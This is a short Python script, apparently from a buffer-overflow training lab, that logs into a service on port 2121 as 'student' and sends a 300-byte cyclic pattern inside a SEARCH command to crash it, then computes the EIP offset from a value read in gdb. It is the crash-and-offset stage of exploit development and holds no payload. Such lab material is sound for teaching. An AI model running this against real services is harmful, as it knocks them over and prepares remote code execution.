#!/usr/bin/env python3
# Find the EIP offset for the SEARCH overflow on the Linux build.
#   1) python3 linux_pattern.py send [host]     -> crash the server with a cyclic pattern
#   2) python3 linux_pattern.py find 0xNNNNNNNN -> print the offset (EIP value from gdb)
import socket, sys, struct, time

HOST = sys.argv[2] if len(sys.argv) > 2 and sys.argv[1] == "send" else "127.0.0.1"
PORT = 2121
LEN  = 300

def pattern(n):
    U="ABCDEFGHIJKLMNOPQRSTUVWXYZ"; L="abcdefghijklmnopqrstuvwxyz"; D="0123456789"
    s=""
    for u in U:
        for l in L:
            for d in D:
                s += u+l+d
                if len(s) >= n: return s[:n]
    return s[:n]

if len(sys.argv) < 2:
    print("usage: linux_pattern.py send [host] | find <hexdword>"); sys.exit()

if sys.argv[1] == "send":
    p = pattern(LEN).encode()
    s = socket.create_connection((HOST, PORT)); s.recv(4096)
    s.sendall(b"LOGIN student student\n"); time.sleep(0.2); print(s.recv(4096))
    s.sendall(b'SEARCH "' + p + b'"\n'); time.sleep(0.5); s.close()
    print("sent %d-byte pattern - check gdb, then: info registers eip" % LEN)

elif sys.argv[1] == "find":
    p = pattern(LEN); v = int(sys.argv[2], 16)
    i = p.find(struct.pack("<I", v).decode("latin1"))
    print("offset to EIP = %d" % i if i != -1 else "value not found - re-check EIP")
